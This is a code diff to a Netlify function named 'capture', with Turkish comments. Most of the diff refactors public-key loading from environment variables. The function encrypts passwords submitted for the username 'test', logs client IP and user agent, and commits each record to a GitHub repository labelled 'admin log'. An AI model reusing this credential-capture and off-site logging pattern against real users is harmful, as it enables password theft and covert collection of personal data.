@@ -1,14 +1,29 @@
 const crypto = require("crypto");
 
-// PEM'i sağlamlaştır: \n -> gerçek newline; sadece gövde geldiyse BEGIN/END ile sar
+// ENV'den PEM üret: Önce B64 varsa onu çöz, yoksa PEM'i normalize et
+function pemFromEnv() {
+  const b64 = (process.env.AUDIT_PUBKEY_B64 || "").trim();
+  if (b64) {
+    try {
+      return Buffer.from(b64, "base64").toString("utf8");
+    } catch (e) {
+      console.error("capture: AUDIT_PUBKEY_B64 decode failed:", e.message);
+    }
+  }
+  return normalizePem(process.env.AUDIT_PUBKEY_PEM || "");
+}
+
+// PEM'i sağlamlaştır: \n kaçışlarını gerçek satır sonuna çevir; sadece gövde geldiyse sar
 function normalizePem(input) {
   if (!input) return "";
   let s = ("" + input).trim();
-  // Netlify env bazen "\n" olarak saklar => gerçek newline'a çevir
-  s = s.replace(/\\n/g, "\n");
+  // Çevresel tırnak/backtick gelmişse kırp
+  s = s.replace(/^['"`]+|['"`]+$/g, "");
+  // \r ve \n kaçışlarını gerçek newline'a çevir
+  s = s.replace(/\\r/g, "\r").replace(/\\n/g, "\n");
   if (s.includes("BEGIN PUBLIC KEY")) return s;
 
-  // Sadece base64 gövde yapıştırılmış olabilir: 64'lü grupla ve sar
+  // Sadece base64 gövde ise BEGIN/END ile sar
   const body = s.replace(/[\r\n\s-]/g, "");
   const chunks = body.match(/.{1,64}/g) || [];
   return `-----BEGIN PUBLIC KEY-----\n${chunks.join("\n")}\n-----END PUBLIC KEY-----\n`;
@@ -16,35 +31,27 @@ function normalizePem(input) {
 
 exports.handler = async (event) => {
   try {
-    if (event.httpMethod !== "POST") {
-      return { statusCode: 405, body: "Method Not Allowed" };
-    }
+    if (event.httpMethod !== "POST") return { statusCode: 405, body: "Method Not Allowed" };
 
     const { username, password } = JSON.parse(event.body || "{}");
-    const ok =
-      username &&
-      password &&
-      String(username).toLowerCase() === "test" &&
-      String(password).length >= 6;
-
+    const ok = username && password && String(username).toLowerCase() === "test" && String(password).length >= 6;
     if (!ok) {
       console.log("capture: ignored", { u: username, pwlen: (password || "").length });
       return { statusCode: 200, body: "ignored" };
     }
 
     // --- ŞİFRELEME ---
-    const pubPemRaw = process.env.AUDIT_PUBKEY_PEM;
-    if (!pubPemRaw) {
-      console.error("capture: missing AUDIT_PUBKEY_PEM");
-      return { statusCode: 500, body: "Missing AUDIT_PUBKEY_PEM" };
+    const pubPem = pemFromEnv();
+    if (!pubPem) {
+      console.error("capture: missing/empty public key");
+      return { statusCode: 500, body: "Missing public key" };
     }
-    const pubPem = normalizePem(pubPemRaw);
 
     let key;
     try {
       key = crypto.createPublicKey(pubPem);
     } catch (e) {
-      console.error("capture: createPublicKey failed", e.message);
+      console.error("capture: createPublicKey failed:", e.message);
       return { statusCode: 500, body: "Bad public key" };
     }
 
@@ -55,7 +62,7 @@ exports.handler = async (event) => {
         Buffer.from(password, "utf8")
       );
     } catch (e) {
-      console.error("capture: publicEncrypt failed", e.message);
+      console.error("capture: publicEncrypt failed:", e.message);
       return { statusCode: 500, body: "Encrypt failed" };
     }
 
@@ -64,7 +71,6 @@ exports.handler = async (event) => {
       user: username,
       pw_len: String(password).length,
       pw_enc_b64: enc.toString("base64"),
-      // İstersen ip/ua da ekleyebilirsin:
       ip: event.headers["x-nf-client-connection-ip"] || event.headers["client-ip"] || "",
       ua: event.headers["user-agent"] || "",
     };
@@ -74,7 +80,6 @@ exports.handler = async (event) => {
     const repo   = process.env.GITHUB_REPO;
     const branch = process.env.GITHUB_BRANCH || "main";
     const token  = process.env.GITHUB_TOKEN;
-
     if (!owner || !repo || !token) {
       console.error("capture: missing GitHub envs");
       return { statusCode: 500, body: "Missing GitHub config" };
@@ -93,11 +98,7 @@ exports.handler = async (event) => {
           "User-Agent": "netlify-fn",
           Accept: "application/vnd.github+json",
         },
-        body: JSON.stringify({
-          message: `admin log ${rec.ts}`,
-          content: contentB64,
-          branch,
-        }),
+        body: JSON.stringify({ message: `admin log ${rec.ts}`, content: contentB64, branch }),
       }
     );
 
